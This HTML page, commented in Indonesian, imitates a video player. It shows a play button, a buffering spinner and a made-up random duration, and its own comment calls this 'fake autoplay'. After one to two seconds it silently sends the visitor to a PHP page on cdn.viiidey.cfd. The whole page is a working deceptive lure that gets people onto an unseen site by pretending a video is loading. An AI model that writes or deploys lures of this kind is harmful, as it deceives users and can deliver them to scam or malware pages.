<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Loading cdn.viiidey.cfd</title>

<style>

    body {

        margin: 0;

        background: #000;

        height: 100vh;

        display: flex;

        justify-content: center;

        align-items: center;

        font-family: Arial;

    }

    .player {

        width: 90%;

        max-width: 500px;

        aspect-ratio: 16/9;

        background: #0d0d0d;

        border-radius: 8px;

        position: relative;

        overflow: hidden;

    }

    /* Icon play kecil di tengah */

    .play-icon {

        width: 65px;

        height: 65px;

        border-radius: 50%;

        background: rgba(255,255,255,0.12);

        backdrop-filter: blur(2px);

        position: absolute;

        top: 50%;

        left: 50%;

        transform: translate(-50%, -50%);

        display: flex;

        justify-content: center;

        align-items: center;

        animation: fadein 0.3s ease-out forwards;

    }

    .play-icon:before {

        content: "";

        margin-left: 3px;

        border-style: solid;

        border-width: 14px 0 14px 24px;

        border-color: transparent transparent transparent white;

    }

    /* Buffering spinner */

    .loader {

        display: none;

        position: absolute;

        top: 50%;

        left: 50%;

        width: 46px;

        height: 46px;

        transform: translate(-50%, -50%);

        border: 4px solid rgba(255,255,255,0.22);

        border-top-color: #fff;

        border-radius: 50%;

        animation: spin .9s linear infinite;

    }

    @keyframes spin {

        to { transform: translate(-50%, -50%) rotate(360deg); }

    }

    @keyframes fadein {

        from { opacity: 0; transform: translate(-50%, -45%); }

        to { opacity: 1; transform: translate(-50%, -50%); }

    }

    /* Durasi pojok kiri bawah */

    .duration {

        position: absolute;

        bottom: 10px;

        left: 12px;

        background: rgba(0,0,0,0.6);

        padding: 4px 8px;

        border-radius: 4px;

        color: #fff;

        font-size: 13px;

    }

</style>

</head>

<body>

<div class="player">

    <div class="play-icon" id="playIcon"></div>

    <div class="loader" id="loader"></div>

    <div class="duration" id="duration"></div>

</div>

<script>

    // Generate random duration

    function randomDur() {

        let m = Math.floor(Math.random() * 8) + 1; // 1–8 menit

        let s = Math.floor(Math.random() * 60);

        if (m < 10) m = "0" + m;

        if (s < 10) s = "0" + s;

        return m + ":" + s;

    }

    document.getElementById("duration").innerText = randomDur();

    // Auto-play palsu

setTimeout(() => { // loader muncul
    document.getElementById("playIcon").style.display = "none";
    document.getElementById("loader").style.display = "block";
}, 800);

const delay = Math.floor(Math.random() * 800) + 1200; // 1,2 – 2 detik
setTimeout(() => {
   window.location.href = "https://cdn.viiidey.cfd/gi.php";
}, delay);



</script>
